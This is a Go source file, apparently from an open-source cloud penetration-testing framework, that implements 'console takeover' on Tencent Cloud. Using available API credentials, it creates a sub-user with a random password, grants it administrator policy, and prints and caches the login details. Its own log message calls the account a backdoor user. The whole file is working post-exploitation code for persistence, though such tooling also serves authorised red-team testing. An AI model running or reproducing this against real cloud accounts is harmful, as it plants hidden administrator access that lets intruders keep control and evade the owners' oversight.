package tencentconsole

import (
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/cloud/tencent/tencentcam"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/database"
	"github.com/teamssix/cf/pkg/util/errutil"
	cam "github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/cam/v20190116"
	"github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/common"
	"os"
	"strings"
)

func CreateUser(userName string, password string) {
	request := cam.NewAddUserRequest()
	request.Name = common.StringPtr(userName)
	request.ConsoleLogin = common.Uint64Ptr(1)
	request.Password = common.StringPtr(password)
	request.NeedResetPassword = common.Uint64Ptr(0)
	_, err := tencentcam.CAMClient().AddUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugf("创建 %s 用户成功 (Create %s user successfully)", userName, userName)
	} else {
		if strings.Contains(err.Error(), "The name already exists") {
			log.Warnf("%s 用户已存在，无法接管，请指定其他的用户名 (%s user already exists and cannot take over, please specify another user name.)", userName, userName)
			os.Exit(0)
		}
	}
}

func GetUserUin(userName string) uint64 {
	request := cam.NewGetUserRequest()
	request.Name = common.StringPtr(userName)
	response, err := tencentcam.CAMClient().GetUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugf("获取 %s 用户 UIN (Get %s user Uin successfully)", userName, userName)
	}
	return *response.Response.Uin
}

func AttachPolicyToUser(userName string) {
	UserUin := GetUserUin(userName)
	request := cam.NewAttachUserPolicyRequest()
	request.PolicyId = common.Uint64Ptr(1)
	request.AttachUin = common.Uint64Ptr(UserUin)
	_, err := tencentcam.CAMClient().AttachUserPolicy(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugf("成功为 %s 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the %s user)", userName, userName)
	}
}

func GetOwnerUin() string {
	request := cam.NewGetUserAppIdRequest()
	response, err := tencentcam.CAMClient().GetUserAppId(request)
	errutil.HandleErrNoExit(err)
	OwnerUin := response.Response.OwnerUin
	return *OwnerUin
}

func TakeoverConsole(userName string) {
	password := util.GenerateRandomPasswords()
	CreateUser(userName, password)
	AttachPolicyToUser(userName)
	OwnerID := GetOwnerUin()
	loginURL := "https://cloud.tencent.com/login/subAccount"
	data := [][]string{
		{OwnerID, userName, password, loginURL},
	}
	database.InsertTakeoverConsoleCache("tencent", OwnerID, userName, password, loginURL)
	var header = []string{"主账号 ID (Primary Account ID)", "子用户名 (Sub User Name)", "登录密码 (Password)", "控制台登录地址 (Login URL)"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
	log.Infof("接管控制台成功，接管控制台会创建 %s 后门用户，如果想删除该后门用户，请执行 cf tencent console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf tencent console cancel.)", userName)
}
